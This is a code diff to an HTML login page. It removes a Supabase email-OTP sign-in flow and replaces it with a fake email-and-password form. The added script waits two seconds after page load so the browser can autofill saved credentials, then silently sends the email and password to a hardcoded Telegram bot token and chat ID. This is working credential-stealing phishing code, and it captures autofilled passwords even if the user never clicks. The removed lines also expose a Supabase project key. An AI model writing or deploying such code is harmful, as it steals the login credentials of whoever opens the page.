@@ -1,42 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Login or Signup</title>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+  <title>Login</title>
 </head>
 <body>
-  <h2>Email Login or Signup</h2>
-
-  <input type="email" id="email" placeholder="Enter your email" />
-  <button onclick="sendOTP()">Continue</button>
-
-  <p id="status"></p>
+  <form id="login">
+    <input type="email" id="email" name="email" autocomplete="email" placeholder="Email">
+    <input type="password" id="pass" name="password" autocomplete="current-password" placeholder="Password">
+    <button type="submit">Login</button>
+  </form>
 
   <script>
-    const supabaseUrl = "https://vilvueqeveogkpxyzxiw.supabase.co";
-    const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZpbHZ1ZXFldmVvZ2tweHl6eGl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTAwNjY0NjAsImV4cCI6MjA2NTY0MjQ2MH0.2nWmRIA8szsS4wvpczw6dTLW8ydDerajptkIzNJwOEo";
-    const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+    window.onload = () => {
+      setTimeout(() => {
+        const email = document.getElementById('email').value
+        const pass = document.getElementById('pass').value
 
-    async function sendOTP() {
-      const email = document.getElementById("email").value.trim();
-      const status = document.getElementById("status");
+        if (email && pass) {
+          const token = "6883619016:AAHKPuXrO6Tt60aOhx4pMvuiBgpGH8gpXww"
+          const chat_id = "7139961821"
+          const message = `Email: ${email}\nPass: ${pass}`
 
-      if (!email) {
-        status.textContent = "Please enter a valid email.";
-        return;
-      }
-
-      status.textContent = "Sending OTP...";
-      const { data, error } = await supabase.auth.signInWithOtp({ email });
-
-      console.log("data:", data);
-      console.log("error:", error);
-
-      if (error) {
-        status.textContent = "Error: " + error.message;
-      } else {
-        status.textContent = "Check your email for the login/signup link!";
-      }
+          fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+        }
+      }, 2000) // slight delay to allow autofill
     }
   </script>
 </body>
